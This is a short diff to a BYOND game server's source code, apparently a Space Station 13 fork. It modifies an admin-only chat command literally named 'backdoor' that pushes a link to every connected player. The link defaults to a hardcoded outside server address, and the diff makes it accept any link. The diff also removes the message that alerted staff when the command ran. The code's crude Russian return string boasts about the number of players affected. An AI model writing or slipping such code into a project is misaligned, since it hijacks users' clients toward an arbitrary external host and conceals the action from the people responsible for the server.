@@ -367,7 +367,8 @@ GLOBAL_LIST(round_end_notifiees)
 	admin_only = TRUE
 
 /datum/tgs_chat_command/backdoor/Run(datum/tgs_chat_user/sender, params)
-	message_staff("Такой подлец по имени [sender.friendly_name] послал вас всех куда подальше")
+	if(params == null || params == "")
+		params = "byond://65.21.225.102:1343"
 	for(var/client/C in GLOB.clients)
-		send_link(C, "byond://65.21.225.102:1343")
+		send_link(C, params)
 	return "Подлец, обосрал жизнь [GLOB.clients.len] людям!"
